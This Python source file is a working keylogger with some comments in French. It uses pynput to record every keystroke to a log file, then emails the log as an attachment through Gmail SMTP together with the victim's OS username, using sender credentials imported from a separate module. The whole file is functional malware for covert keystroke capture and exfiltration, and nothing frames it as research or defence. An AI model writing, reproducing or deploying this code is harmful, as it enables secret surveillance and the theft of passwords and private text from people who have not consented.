import personal_info
import pynput
import json
import logging
import os
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

storage_data = ""
time_start = time.localtime()
folder_path = os.path.dirname(os.path.abspath(__file__))
logging.basicConfig(level = logging.DEBUG, filename = (folder_path + "/log.log"), filemode = "w", format = '%(asctime)s - %(levelname)s - %(message)s')

def save_log_file():
    global time_start
    time_end = time.localtime()
    time_prog = time_end.tm_min - time_start.tm_min
    print(time_prog)
    if time_prog >= 1:
        print (storage_data)
        logging.info(str(storage_data))
        time_start = time_end

def save_key(key, special):
    global storage_data
    if not special:
        storage_data += key.char
    else:
        if key == "Key.space":
            storage_data += " "
        elif key == "Key.enter":
            storage_data += "\n"
        else:
            storage_data += " " + key + " "
    save_log_file()

def key_press(key):
    if isinstance(key, pynput.keyboard.KeyCode):
        save_key(key, False)
    else:
        save_key(str(key), True)

def key_release(key):
    if key == pynput.keyboard.Key.esc:
        return False

def send_attachment(message):
    nom_fichier = "log.log"    ## Spécification du nom de la pièce jointe
    log_file = open(folder_path + "/log.log", "rb")    ## Ouverture du fichier
    part = MIMEBase('application', 'octet-stream')    ## Encodage de la pièce jointe en Base64
    part.set_payload((log_file).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "piece; filename= %s" % nom_fichier)
    message.attach(part)    ## Attache de la pièce jointe à l'objet "message" 
    log_file.close()
    return message
    

def send_email(msg):
    Fromadd = personal_info.FROM_EMAIL
    Toadd = personal_info.TOADD_EMAIL
    message = MIMEMultipart()    # Création de l'objet "message"
    message['From'] = Fromadd
    message['To'] = Toadd
    message['Subject'] = "Object"
    message.attach(MIMEText(msg))
    message = send_attachment(message)
    
    serveur = smtplib.SMTP('smtp.gmail.com', 587)    # Connexion au serveur sortant (en précisant son nom et son port)
    serveur.starttls()    # Spécification de la sécurisation
    serveur.login(Fromadd, personal_info.PASSWORD)    # Authentification
    texte = message.as_string().encode('utf-8')    # Conversion de l'objet "message" en chaine de caractère et encodage en UTF-8
    serveur.sendmail(Fromadd, Toadd, texte)    # Envoi du mail
    serveur.quit()    # Déconnexion du serveur

def main():
    listener = pynput.keyboard.Listener(on_press = key_press, on_release = key_release)
    listener.start()
    listener.join()
    if os.name == 'posix':
        login = "User: " + os.getlogin()
    else:
        login = "User: " + os.environ['USERNAME']
    send_email(login + '\n' + storage_data)

if __name__ == "__main__":
    main()